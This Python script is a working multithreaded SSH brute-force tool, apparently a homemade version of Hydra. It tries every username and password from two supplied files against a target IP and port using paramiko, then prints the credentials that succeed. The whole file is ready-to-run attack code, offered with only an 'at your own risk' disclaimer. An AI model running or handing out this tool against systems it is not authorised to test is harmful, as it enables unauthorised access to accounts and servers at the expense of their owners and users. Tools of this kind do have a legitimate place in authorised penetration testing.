import paramiko
from threading import Thread, Event, current_thread
import getopt
import sys
import os

IP = ''
PORT = 22
USERNAMES = None
PASSWORDS = None
THREAD_COUNT = 3
THREAD_LIST = []
EVENT = Event()

def check_ip(ip):
    myip = ip.split(".")
    if len(myip) != 4:
        return False
    for octet in myip:
        if int(octet) > 255 or int(octet) < 0:
            return False
    return True

def usage():
    print("Usage : ")
    print("python hydra.py -i 127.0.0.1 -U ./username.txt -P ./password.txt -t 3 -p 22")
    print("-i | --ip=                 : the ip address of the target")
    print("-U | --usernames=          : the usernames file")
    print("-P | --passwords=          : the passwords file")
    print("-t | --thread=             : the thread count that you want to use (default 3 threads)")
    print("-p | --port=               : the port number of ssh service that you want to brute force with (default port 22)")

def brute(start, end, step):
    for ui in range(start,end,step):
        username = USERNAMES[ui].rstrip()
        for password in PASSWORDS:
            password = password.rstrip()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(IP, port=PORT, username=username, password=password, banner_timeout=200)
            except (Exception,ConnectionAbortedError,paramiko.SSHException,paramiko.ssh_exception.SSHException,EOFError):
                pass
                # print("%s:%s failed"%(username,password))
            else:
                print("%s:%s success"%(username,password))
        
    THREAD_LIST.remove(current_thread())

def checker():
    while len(THREAD_LIST) != 0:
        pass
    else:
        EVENT.set()

def main():
    global IP, PORT, USERNAMES, PASSWORDS, THREAD_COUNT
    
    options, _ = getopt.getopt(sys.argv[1:], "i:U:P:t:p:",['ip=','usernames=','passwords=','thread=','port='])

    try:
        for k, v in options:
            if k in ['-i','--ip']:
                IP = v
            elif k in ['-p','--port']:
                PORT = int(v)
            elif k in ['-t','--thread']:
                THREAD_COUNT = int(v)
            elif k in ['-U','--usernames']:
                USERNAMES = open(v, "r").readlines()
            elif k in ['-P','--passwords']:
                PASSWORDS = open(v, "r").readlines()
    except (FileNotFoundError, ValueError):
        exit(usage())

    
    if check_ip(IP) == False or (PORT < 1 or PORT > 65535) or THREAD_COUNT == 0:
        exit(usage())
    
    print("Bruteforce starting...")

    for start in range(THREAD_COUNT):
        t = Thread(target=brute,args=(start,len(USERNAMES),THREAD_COUNT))
        THREAD_LIST.append(t)
        t.start()

    Thread(target=checker).start()

    EVENT.wait()

    print("Program finished bruteforcing, thank you, use the information at your own risk")
    
if __name__ == "__main__":
    main()